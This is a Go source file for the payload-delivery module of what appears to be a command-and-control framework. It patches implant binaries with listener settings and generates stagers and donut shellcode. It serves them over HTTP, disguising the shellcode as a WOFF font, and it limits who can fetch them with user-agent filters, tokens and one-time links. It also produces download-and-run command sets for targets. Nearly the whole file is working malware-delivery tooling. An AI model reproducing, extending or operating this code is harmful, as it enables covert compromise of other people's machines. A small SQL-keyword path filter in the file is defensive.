package api

import (
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/delivery"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/godonut"
	"context"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"BackendTemplate/pkg/utils/logx"
)

// legacy dedicated-port servers (bind_mode=dedicated)
var WebDeliveryServer = make(map[string]*http.Server)
var Mutex sync.Mutex

// validateDownloadPath 验证和清理下载路径
func validateDownloadPath(path string, osType string) (string, error) {
	if path == "" {
		if osType == "windows" {
			return `C:\Windows\Temp`, nil
		}
		return "/tmp", nil
	}
	path = strings.TrimSpace(path)
	sqlPatterns := []string{
		`'`, `"`, `;`, `--`, `/*`, `*/`, `xp_`, `sp_`,
		`union`, `select`, `insert`, `update`, `delete`, `drop`,
		`exec`, `execute`, `script`, `<script`, `javascript:`,
	}
	lowerPath := strings.ToLower(path)
	for _, pattern := range sqlPatterns {
		if strings.Contains(lowerPath, strings.ToLower(pattern)) {
			return "", fmt.Errorf("路径包含不安全字符: %s", pattern)
		}
	}
	if strings.Contains(path, "..") || strings.Contains(path, "~") {
		return "", fmt.Errorf("路径不能包含 '..' 或 '~'")
	}
	if len(path) > 200 {
		return "", fmt.Errorf("路径长度不能超过200个字符")
	}
	return path, nil
}

// inferPayloadFormat 从文件名推断载荷格式（.dll 结尾视为 dll，其余默认 exe）
func inferPayloadFormat(filename string) string {
	if strings.HasSuffix(strings.ToLower(filename), ".dll") {
		return "dll"
	}
	return "exe"
}

// loadAndPatchClient reads embedded binary and patches placeholders
func loadAndPatchClient(listener, osType, archType, pass, format string) ([]byte, string, error) {
	if listener == "" || !strings.Contains(listener, "://") {
		return nil, "", fmt.Errorf("listener 格式错误，应为 protocol://address")
	}
	tmp := strings.SplitN(listener, "://", 2)
	listenerType := strings.ToLower(tmp[0])
	// https 有独立客户端目录 server/https（含 https_ 前缀二进制）
	binaryDir := listenerType
	var binaryFileName string
	if strings.ToLower(format) == "dll" {
		if strings.ToLower(osType) != "windows" {
			return nil, "", fmt.Errorf("dll 格式仅支持 windows 目标")
		}
		binaryFileName = findBinaryWithExt(binaryDir, osType, archType, []string{".dll"})
	} else {
		binaryFileName = findBinary(binaryDir, osType, archType)
	}
	if binaryFileName == "" {
		return nil, "", fmt.Errorf("未找到匹配的客户端二进制: protocol=%s os=%s arch=%s format=%s", listenerType, osType, archType, format)
	}
	// 读取嵌入模板（gzip 压缩，readTemplate 自动解压，兼容未压缩旧模板）
	binaryData, err := readTemplate(binaryDir, binaryFileName)
	if err != nil {
		return nil, "", fmt.Errorf("读取文件失败: %v", err)
	}
	patched, err := delivery.PatchClientBinary(binaryData, delivery.PatchOptions{
		ListenerConfig: listener,
		OS:             osType,
		Arch:           archType,
		Pass:           pass,
		Format:         format,
		HashPad:        cfgHashPad(),
	})
	if err != nil {
		return nil, "", err
	}
	return patched, binaryFileName, nil
}

// ListWebDelivery 列表
func ListWebDelivery(c *gin.Context) {
	var webs []database.WebDelivery
	database.Engine.Find(&webs)
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": webs})
}

// startDeliveryRequest 创建投递请求体（兼容旧字段 + Hub 新字段）
type startDeliveryRequest struct {
	Listener     string `json:"listener"`
	OS           string `json:"os"`
	Arch         string `json:"arch"`
	Port         string `json:"port"` // dedicated 模式端口；shared 可空
	Filename     string `json:"filename"`
	Pass         string `json:"pass"`
	DownloadPath string `json:"downloadPath"`
	SaveFilename string `json:"saveFilename"`

	// Hub 扩展
	BindMode         string `json:"bindMode"` // shared | dedicated（默认 shared）
	PublicHost       string `json:"publicHost"`
	PublicScheme     string `json:"publicScheme"` // http | https
	BasePath         string `json:"basePath"`     // CDN path prefix
	URIPath          string `json:"uriPath"`
	ContentType      string `json:"contentType"`
	StageContentType string `json:"stageContentType"`
	AccessToken      string `json:"accessToken"`
	UAAllow          string `json:"uaAllow"`
	MaxDownloads     int    `json:"maxDownloads"`
	OneTime          bool   `json:"oneTime"`
	BuildStager      *bool  `json:"buildStager"` // 默认 true
	Format           string `json:"format"`      // exe(默认) | dll（仅 windows，rundll32/regsvr32 加载）
	Note             string `json:"note"`
}

// StartWebDelivery 创建并启动投递（Delivery Hub）
func StartWebDelivery(c *gin.Context) {
	var req startDeliveryRequest
	if err := c.ShouldBindJSON(&req); err != nil {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	// 前端从监听器列表选的地址是脱敏值，先还原：否则会把占位符落库并 patch 进载荷
	req.Listener = resolveListenerAddress(req.Listener, "connect")
	if req.Listener == "" || req.OS == "" || req.Arch == "" {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "listener/os/arch 必填"})
		return
	}

	validatedPath, err := validateDownloadPath(req.DownloadPath, req.OS)
	if err != nil {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	req.DownloadPath = validatedPath

	bindMode := strings.ToLower(strings.TrimSpace(req.BindMode))
	if bindMode == "" {
		// 若显式给了 port 且不是 shared，走 dedicated 兼容；否则默认 shared
		if req.Port != "" && req.Port != "0" && !strings.HasPrefix(req.Port, "shared") {
			bindMode = "dedicated"
		} else {
			bindMode = "shared"
		}
	}
	if bindMode != "shared" && bindMode != "dedicated" {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "bindMode 仅支持 shared 或 dedicated"})
		return
	}
	if bindMode == "dedicated" && (req.Port == "" || req.Port == "0") {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "dedicated 模式必须指定 port"})
		return
	}

	// 防止 dedicated 端口冲突
	if bindMode == "dedicated" {
		Mutex.Lock()
		_, exists := WebDeliveryServer[req.Port]
		Mutex.Unlock()
		if exists {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "端口已被占用: " + req.Port})
			return
		}
		var existing database.WebDelivery
		if has, _ := database.Engine.Where("listening_port = ? AND status = 1", req.Port).Get(&existing); has {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "端口记录已存在: " + req.Port})
			return
		}
	}

	reqFormat := strings.ToLower(strings.TrimSpace(req.Format))
	if reqFormat != "" && reqFormat != "exe" && reqFormat != "dll" {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "format 仅支持 exe 或 dll"})
		return
	}

	patched, binName, err := loadAndPatchClient(req.Listener, req.OS, req.Arch, req.Pass, reqFormat)
	if err != nil {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}

	meta := database.WebDelivery{
		ListenerConfig:   req.Listener,
		OS:               req.OS,
		Arch:             req.Arch,
		ListeningPort:    req.Port,
		Status:           1,
		FileName:         req.Filename,
		Pass:             req.Pass,
		DownloadPath:     req.DownloadPath,
		SaveFilename:     req.SaveFilename,
		BindMode:         bindMode,
		PublicHost:       req.PublicHost,
		PublicScheme:     req.PublicScheme,
		BasePath:         req.BasePath,
		URIPath:          strings.Trim(req.URIPath, "/"),
		ContentType:      req.ContentType,
		StageContentType: req.StageContentType,
		AccessToken:      req.AccessToken,
		UAAllow:          req.UAAllow,
		MaxDownloads:     req.MaxDownloads,
		Note:             req.Note,
	}
	if req.OneTime {
		meta.OneTime = 1
	}
	// 【XOR 混淆】默认不启用（XorKey=0）：full/stager 载荷保持明文，用户可直接下载运行。
	// 启用方式：数据库/接口显式设置 XorKey 后，载荷经 XOR 加密下发，
	// Stager 模板内置同 key 解密（直接下载 full 运行的用户需自行解密）。
	// 此前自动随机设置 XorKey 导致直接下载的客户端被加密 → 无法运行。
	if meta.FileName == "" {
		meta.FileName = binName
	}
	delivery.EnsureMetaDefaults(&meta)

	// 先填 URL（stager 构建需要下载地址）
	delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())

	buildStager := true
	if req.BuildStager != nil {
		buildStager = *req.BuildStager
	}

	// 完整载荷
	payload, err := delivery.BuildPayload(meta, patched, false)
	if err != nil {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}

	// 动态 stager：指向 full 或 woff（dll 格式仅提供 full，不做 donut/stager）
	if buildStager && reqFormat != "dll" {
		dl := meta.ServerAddress
		if meta.OS == "windows" && meta.ShellcodeURL != "" {
			// Windows 传统 stager 拉 woff；hub 的 stager 模板带密码执行完整文件，优先 full
			dl = meta.ServerAddress
		}
		if stagerBin, err := delivery.RebuildStagerForURL(meta, dl); err == nil {
			payload.Stager = stagerBin
			// 若还没有 shellcode，尝试对 stager 做 donut
			if len(payload.Shellcode) == 0 && meta.OS == "windows" {
				if sc, err2 := godonut.GenShellcode(stagerBin, "", meta.Arch); err2 == nil {
					payload.Shellcode = sc
				}
			}
		} else {
			logx.Infof("[WebDelivery] stager 构建跳过: %v\n", err)
		}
	}

	// 再生成一次 shellcode（对 full）若仍空（dll 跳过）
	if len(payload.Shellcode) == 0 && meta.OS == "windows" && reqFormat != "dll" {
		if sc, err := godonut.GenShellcode(patched, meta.Pass, meta.Arch); err == nil {
			payload.Shellcode = sc
		}
	}

	// 入库
	if _, err := database.Engine.Insert(&meta); err != nil {
		// 无 ID 主键的旧库可能失败；尝试不带 ID
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "写入数据库失败: " + err.Error()})
		return
	}

	// 注册到 Hub
	delivery.GlobalHub.Register(meta, payload)

	// dedicated 模式：额外在独立端口提供兼容路由
	if bindMode == "dedicated" {
		if err := startDedicatedServer(meta, payload); err != nil {
			// 回滚 hub + db
			delivery.GlobalHub.Unregister(meta.PublicKey, meta.ListeningPort)
			database.Engine.Where("public_key = ?", meta.PublicKey).Delete(&database.WebDelivery{})
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "独立端口启动失败: " + err.Error()})
			return
		}
	}

	// 命令矩阵
	cmds := delivery.GenerateCommands(delivery.CommandOptions{
		FullURL:      meta.ServerAddress,
		StagerURL:    meta.StagerURL,
		ShellcodeURL: meta.ShellcodeURL,
		OS:           meta.OS,
		Arch:         meta.Arch,
		Pass:         meta.Pass,
		DownloadPath: meta.DownloadPath,
		SaveFilename: meta.SaveFilename,
		AccessToken:  meta.AccessToken,
	})

	// D18: 业务审计
	auditLogEvent("WEBDELIVERY_START", "SUCCESS", "启动投递 "+meta.PublicKey+" ("+meta.OS+"/"+meta.Arch+")", map[string]interface{}{"key": meta.PublicKey, "os": meta.OS, "arch": meta.Arch})
	c.JSON(http.StatusOK, gin.H{
		"status": http.StatusOK,
		"data": gin.H{
			"delivery": meta,
			"commands": cmds,
			"urls": gin.H{
				"full":      meta.ServerAddress,
				"stager":    meta.StagerURL,
				"shellcode": meta.ShellcodeURL,
			},
		},
	})
}

func startDedicatedServer(meta database.WebDelivery, payload delivery.Payload) error {
	mux := http.NewServeMux()
	// legacy path /{filename}
	fname := meta.FileName
	// J9: 文件名白名单（原直接注册 → Go 1.24 ServeMux 含 {/} 等模式字符可 panic/意外路由）
	if err := validateDeliveryFileName(fname); err != nil {
		return err
	}
	mux.HandleFunc("/"+fname, func(w http.ResponseWriter, r *http.Request) {
		serveBytes(w, r, payload.Full, meta.ContentType, fname, true)
	})
	// hub-compatible paths on same port
	mux.HandleFunc("/d/", func(w http.ResponseWriter, r *http.Request) {
		delivery.GlobalHub.ServeHTTP(w, r)
	})
	// legacy woff
	if meta.OS == "windows" && len(payload.Shellcode) > 0 {
		mux.HandleFunc("/"+fname+".woff", func(w http.ResponseWriter, r *http.Request) {
			ct := meta.StageContentType
			if ct == "" {
				ct = "font/woff"
			}
			serveBytes(w, r, payload.Shellcode, ct, fname+".woff", false)
		})
	}
	// also /stager /sc shortcuts
	mux.HandleFunc("/stager", func(w http.ResponseWriter, r *http.Request) {
		if len(payload.Stager) == 0 {
			http.NotFound(w, r)
			return
		}
		name := "stager"
		if meta.OS == "windows" {
			name = "stager.exe"
		}
		serveBytes(w, r, payload.Stager, meta.ContentType, name, true)
	})
	mux.HandleFunc("/sc", func(w http.ResponseWriter, r *http.Request) {
		if len(payload.Shellcode) == 0 {
			http.NotFound(w, r)
			return
		}
		ct := meta.StageContentType
		if ct == "" {
			ct = "application/octet-stream"
		}
		serveBytes(w, r, payload.Shellcode, ct, "payload.bin", true)
	})

	server := &http.Server{
		Addr:              ":" + meta.ListeningPort,
		Handler:           mux,
		ReadHeaderTimeout: 30 * time.Second, // 防 Slowloris
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      120 * time.Second, // 大文件下载预留足够写超时
		IdleTimeout:       120 * time.Second,
	}
	Mutex.Lock()
	WebDeliveryServer[meta.ListeningPort] = server
	Mutex.Unlock()
	go func() {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logx.Println("[WebDelivery dedicated]", err)
		}
	}()
	return nil
}

func serveBytes(w http.ResponseWriter, r *http.Request, data []byte, contentType, filename string, asAttachment bool) {
	if len(data) == 0 {
		http.NotFound(w, r)
		return
	}
	if contentType == "" {
		contentType = "application/octet-stream"
	}
	w.Header().Set("Content-Type", contentType)
	if asAttachment {
		w.Header().Set("Content-Disposition", "attachment; filename="+filename)
	}
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	w.Write(data)
}

// CloseWebDelivery 关闭
func CloseWebDelivery(c *gin.Context) {
	var web struct {
		Port      string `json:"port"`
		PublicKey string `json:"publicKey"`
		ID        int64  `json:"id"`
	}
	if err := c.ShouldBindJSON(&web); err != nil {
	c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err.Error()})
		return
	}

	var meta database.WebDelivery
	found := false
	if web.ID > 0 {
		found, _ = database.Engine.ID(web.ID).Get(&meta)
	}
	if !found && web.PublicKey != "" {
		found, _ = database.Engine.Where("public_key = ?", web.PublicKey).Get(&meta)
	}
	if !found && web.Port != "" {
		found, _ = database.Engine.Where("listening_port = ?", web.Port).Get(&meta)
	}
	if !found {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
		return
	}

	// stop dedicated server if any
	if meta.ListeningPort != "" {
		Mutex.Lock()
		if srv, ok := WebDeliveryServer[meta.ListeningPort]; ok {
			_ = srv.Close()
			delete(WebDeliveryServer, meta.ListeningPort)
		}
		Mutex.Unlock()
	}
	delivery.GlobalHub.Unregister(meta.PublicKey, meta.ListeningPort)
	database.Engine.ID(meta.ID).Cols("status").Update(&database.WebDelivery{Status: 2})
	// legacy rows without id
	if meta.ID == 0 {
		database.Engine.Where("listening_port = ?", meta.ListeningPort).Cols("status").Update(&database.WebDelivery{Status: 2})
	}
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

// OpenWebDelivery 重新开启
func OpenWebDelivery(c *gin.Context) {
	var web struct {
		Port      string `json:"port"`
		PublicKey string `json:"publicKey"`
		ID        int64  `json:"id"`
	}
	if err := c.ShouldBindJSON(&web); err != nil {
	c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err.Error()})
		return
	}

	var meta database.WebDelivery
	found := false
	if web.ID > 0 {
		found, _ = database.Engine.ID(web.ID).Get(&meta)
	}
	if !found && web.PublicKey != "" {
		found, _ = database.Engine.Where("public_key = ?", web.PublicKey).Get(&meta)
	}
	if !found && web.Port != "" {
		found, _ = database.Engine.Where("listening_port = ?", web.Port).Get(&meta)
	}
	if !found {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
		return
	}

	patched, _, err := loadAndPatchClient(meta.ListenerConfig, meta.OS, meta.Arch, meta.Pass, inferPayloadFormat(meta.FileName))
	if err != nil {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	if meta.BindMode == "" {
		if strings.HasPrefix(meta.ListeningPort, "shared") || meta.PublicKey != "" && (meta.ListeningPort == "" || strings.HasPrefix(meta.ListeningPort, "shared")) {
			meta.BindMode = "shared"
		} else if meta.ListeningPort != "" {
			meta.BindMode = "dedicated"
		} else {
			meta.BindMode = "shared"
		}
	}
	delivery.EnsureMetaDefaults(&meta)
	delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())

	payload, err := delivery.BuildPayload(meta, patched, false)
	if err != nil {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	if stagerBin, err := delivery.RebuildStagerForURL(meta, meta.ServerAddress); err == nil {
		payload.Stager = stagerBin
	}
	if len(payload.Shellcode) == 0 && meta.OS == "windows" {
		if sc, err := godonut.GenShellcode(patched, meta.Pass, meta.Arch); err == nil {
			payload.Shellcode = sc
		}
	}

	meta.Status = 1
	if meta.ID > 0 {
		database.Engine.ID(meta.ID).Cols("status", "server_address", "stager_url", "shellcode_url", "public_key", "bind_mode").Update(&meta)
	} else {
		database.Engine.Where("listening_port = ?", meta.ListeningPort).Update(&meta)
	}

	delivery.GlobalHub.Register(meta, payload)
	if meta.BindMode == "dedicated" {
		// ensure port free
		Mutex.Lock()
		if old, ok := WebDeliveryServer[meta.ListeningPort]; ok {
			_ = old.Close()
			delete(WebDeliveryServer, meta.ListeningPort)
		}
		Mutex.Unlock()
		if err := startDedicatedServer(meta, payload); err != nil {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
			return
		}
	}
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": meta})
}

// DeleteWebDelivery 删除
func DeleteWebDelivery(c *gin.Context) {
	var web struct {
		Port      string `json:"port"`
		PublicKey string `json:"publicKey"`
		ID        int64  `json:"id"`
	}
	if err := c.ShouldBindJSON(&web); err != nil {
	c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err.Error()})
		return
	}
	var meta database.WebDelivery
	found := false
	if web.ID > 0 {
		found, _ = database.Engine.ID(web.ID).Get(&meta)
	}
	if !found && web.PublicKey != "" {
		found, _ = database.Engine.Where("public_key = ?", web.PublicKey).Get(&meta)
	}
	if !found && web.Port != "" {
		found, _ = database.Engine.Where("listening_port = ?", web.Port).Get(&meta)
	}
	if !found {
		// still try delete by port for legacy
		if web.Port != "" {
			Mutex.Lock()
			if srv, ok := WebDeliveryServer[web.Port]; ok {
				_ = srv.Close()
				delete(WebDeliveryServer, web.Port)
			}
			Mutex.Unlock()
			delivery.GlobalHub.Unregister("", web.Port)
			database.Engine.Where("listening_port = ?", web.Port).Delete(&database.WebDelivery{})
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
			return
		}
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
		return
	}

	if meta.ListeningPort != "" {
		Mutex.Lock()
		if srv, ok := WebDeliveryServer[meta.ListeningPort]; ok {
			_ = srv.Close()
			delete(WebDeliveryServer, meta.ListeningPort)
		}
		Mutex.Unlock()
	}
	auditLogEvent("WEBDELIVERY_DELETE", "SUCCESS", "删除投递 "+meta.PublicKey, nil)
	delivery.GlobalHub.Unregister(meta.PublicKey, meta.ListeningPort)
	if meta.ID > 0 {
		database.Engine.ID(meta.ID).Delete(&database.WebDelivery{})
		database.Engine.Where("delivery_id = ?", meta.ID).Delete(&database.DeliveryAccessLog{})
	} else {
		database.Engine.Where("listening_port = ?", meta.ListeningPort).Delete(&database.WebDelivery{})
	}
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

// GetDeliveryCommands 获取某条投递的上线命令矩阵
func GetDeliveryCommands(c *gin.Context) {
	idStr := c.Query("id")
	port := c.Query("port")
	key := c.Query("publicKey")

	var meta database.WebDelivery
	found := false
	if idStr != "" {
		id, _ := strconv.ParseInt(idStr, 10, 64)
		if id > 0 {
			found, _ = database.Engine.ID(id).Get(&meta)
		}
	}
	if !found && key != "" {
		found, _ = database.Engine.Where("public_key = ?", key).Get(&meta)
	}
	if !found && port != "" {
		found, _ = database.Engine.Where("listening_port = ?", port).Get(&meta)
	}
	if !found {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
		return
	}
	// refresh URLs
	delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())
	cmds := delivery.GenerateCommands(delivery.CommandOptions{
		FullURL:      meta.ServerAddress,
		StagerURL:    meta.StagerURL,
		ShellcodeURL: meta.ShellcodeURL,
		OS:           meta.OS,
		Arch:         meta.Arch,
		Pass:         meta.Pass,
		DownloadPath: meta.DownloadPath,
		SaveFilename: meta.SaveFilename,
		AccessToken:  meta.AccessToken,
	})
	// 【统一响应格式】urls 并入 data（含 status+data+urls 的响应经包装中间件后
	// 额外顶层字段会丢失；业务数据统一放 data）
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": gin.H{
		"commands": cmds,
		"urls": gin.H{
			"full": meta.ServerAddress, "stager": meta.StagerURL, "shellcode": meta.ShellcodeURL,
		},
	}})
}

// GetDeliveryAccessLogs 访问日志
func GetDeliveryAccessLogs(c *gin.Context) {
	idStr := c.Query("id")
	key := c.Query("publicKey")
	limit := 100
	if v := c.Query("limit"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 1000 {
			limit = n
		}
	}
	var logs []database.DeliveryAccessLog
	q := database.Engine.Desc("id").Limit(limit)
	if idStr != "" {
		id, _ := strconv.ParseInt(idStr, 10, 64)
		q = q.Where("delivery_id = ?", id)
	} else if key != "" {
		q = q.Where("public_key = ?", key)
	}
	_ = q.Find(&logs)
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": logs})
}

// RestoreWebDeliveriesOnStartup 启动时恢复 status=1 的 shared/dedicated 投递
func RestoreWebDeliveriesOnStartup() {
	var list []database.WebDelivery
	if err := database.Engine.Where("status = ?", 1).Find(&list); err != nil {
		return
	}
	for _, meta := range list {
		if meta.BindMode == "" {
			if strings.HasPrefix(meta.ListeningPort, "shared") {
				meta.BindMode = "shared"
			} else if meta.ListeningPort != "" && meta.ListeningPort != "0" {
				meta.BindMode = "dedicated"
			} else {
				meta.BindMode = "shared"
			}
		}
		delivery.EnsureMetaDefaults(&meta)
		delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())
		patched, _, err := loadAndPatchClient(meta.ListenerConfig, meta.OS, meta.Arch, meta.Pass, inferPayloadFormat(meta.FileName))
		if err != nil {
			// 【修复】恢复失败时自动清理失效投递：
			// 若关联监听器已从前端删除（DB 残留），删除投递记录避免每次启动重复报错刷屏；
			// 若监听器仍存在但模板不匹配（旧模板），禁用记录等待重建
			cleanupResult := cleanupOrphanDelivery(&meta)
			logx.Infof("[WebDelivery] 恢复失败 %s: %v（%s）\n", meta.PublicKey, err, cleanupResult)
			continue
		}
		payload, err := delivery.BuildPayload(meta, patched, false)
		if err != nil {
			continue
		}
		if stagerBin, err := delivery.RebuildStagerForURL(meta, meta.ServerAddress); err == nil {
			payload.Stager = stagerBin
		}
		if len(payload.Shellcode) == 0 && meta.OS == "windows" {
			if sc, err := godonut.GenShellcode(patched, meta.Pass, meta.Arch); err == nil {
				payload.Shellcode = sc
			}
		}
		delivery.GlobalHub.Register(meta, payload)
		if meta.BindMode == "dedicated" && meta.ListeningPort != "" && !strings.HasPrefix(meta.ListeningPort, "shared") {
			_ = startDedicatedServer(meta, payload)
		}
		logx.Infof("[WebDelivery] 已恢复投递 key=%s mode=%s\n", meta.PublicKey, meta.BindMode)
	}
}

// cleanupOrphanDelivery 恢复投递失败时的自动清理：
// 关联监听器已删除 → 删除投递记录；监听器仍在但模板不匹配 → 禁用记录（status=0）
func cleanupOrphanDelivery(meta *database.WebDelivery) string {
	// 解析 ListenerConfig（格式 protocol://address）
	listenerType := ""
	listenerAddr := ""
	if parts := strings.SplitN(meta.ListenerConfig, "://", 2); len(parts) == 2 {
		listenerType = strings.ToLower(parts[0])
		listenerAddr = parts[1]
	}

	if listenerType != "" && listenerAddr != "" {
		// 监听器存在性检查：connect_address 或 listen_address（含 0.0.0.0/:port 变体）
		var lis database.Listener
		exists, _ := database.Engine.
			Where("type = ? AND (connect_address = ? OR listen_address = ? OR listen_address = ? OR listen_address = ?)",
				listenerType, listenerAddr, listenerAddr, "0.0.0.0"+listenerAddr[strings.LastIndex(listenerAddr, ":"):], ":"+listenerAddr[strings.LastIndex(listenerAddr, ":")+1:]).
			Get(&lis)
		if !exists {
			// 监听器已删除：删除残留投递记录（一次性清理）
			affected, _ := database.Engine.Where("public_key = ?", meta.PublicKey).Delete(&database.WebDelivery{})
			if affected > 0 {
				return "关联监听器已删除，已自动清理残留投递记录"
			}
			return "关联监听器已删除，清理失败"
		}
	}

	// 监听器仍存在但模板不匹配（旧模板）：禁用投递，避免每次启动重复失败
	_, err := database.Engine.Where("public_key = ?", meta.PublicKey).Update(&database.WebDelivery{Status: 0})
	if err == nil {
		return "模板与当前代码不匹配，已禁用（可删除后重新创建投递）"
	}
	return "模板不匹配，禁用失败: " + err.Error()
}

// Keep encrypt import used (key path may use in future); silence if unused after refactor
var _ = encrypt.EncodeBase64


// GetDeliveryDefaults 返回全局 delivery（CDN/HTTPS）默认配置，供前端表单预填
func GetDeliveryDefaults(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": delivery.GetDefaultsView()})
}

// PreviewDeliveryURLs 根据表单预览最终公开 URL（不落库）
func PreviewDeliveryURLs(c *gin.Context) {
	var req struct {
		Listener     string `json:"listener"`
		OS           string `json:"os"`
		FileName     string `json:"filename"`
		BindMode     string `json:"bindMode"`
		Port         string `json:"port"`
		PublicHost   string `json:"publicHost"`
		PublicScheme string `json:"publicScheme"`
		BasePath     string `json:"basePath"`
		URIPath      string `json:"uriPath"`
		PublicKey    string `json:"publicKey"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	req.Listener = resolveListenerAddress(req.Listener, "connect")
	meta := database.WebDelivery{
		ListenerConfig: req.Listener,
		OS:             req.OS,
		FileName:       req.FileName,
		BindMode:       req.BindMode,
		ListeningPort:  req.Port,
		PublicHost:     req.PublicHost,
		PublicScheme:   req.PublicScheme,
		BasePath:       req.BasePath,
		URIPath:        strings.Trim(req.URIPath, "/"),
		PublicKey:      req.PublicKey,
	}
	if meta.PublicKey == "" {
		meta.PublicKey = "preview"
	}
	if meta.BindMode == "" {
		meta.BindMode = "shared"
	}
	delivery.EnsureMetaDefaults(&meta)
	delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": gin.H{
		"full":      meta.ServerAddress,
		"stager":    meta.StagerURL,
		"shellcode": meta.ShellcodeURL,
		"scheme_host_path": gin.H{
			"publicHost":   meta.PublicHost,
			"publicScheme": meta.PublicScheme,
			"basePath":     meta.BasePath,
			"uriPath":      meta.URIPath,
		},
	}})
}


// CloseAllWebDeliveryServers 优雅关闭所有 dedicated 投递服务器（进程退出时调用）
func CloseAllWebDeliveryServers() {
	Mutex.Lock()
	defer Mutex.Unlock()
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	for port, srv := range WebDeliveryServer {
		if srv != nil {
			if err := srv.Shutdown(ctx); err != nil {
				logx.Infof("[WebDelivery] 关闭端口 %s 失败: %v\n", port, err)
			}
		}
		delete(WebDeliveryServer, port)
	}
}

// validateDeliveryFileName 校验交付文件名（J9: 仅允许常规文件名，防 ServeMux 模式注入）
func validateDeliveryFileName(name string) error {
	if name == "" || len(name) > 128 {
		return fmt.Errorf("交付文件名非法")
	}
	for _, r := range name {
		if !(r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' ||
			r == '.' || r == '_' || r == '-') {
			return fmt.Errorf("交付文件名包含非法字符: %q", r)
		}
	}
	if strings.Contains(name, "..") {
		return fmt.Errorf("交付文件名非法")
	}
	return nil
}
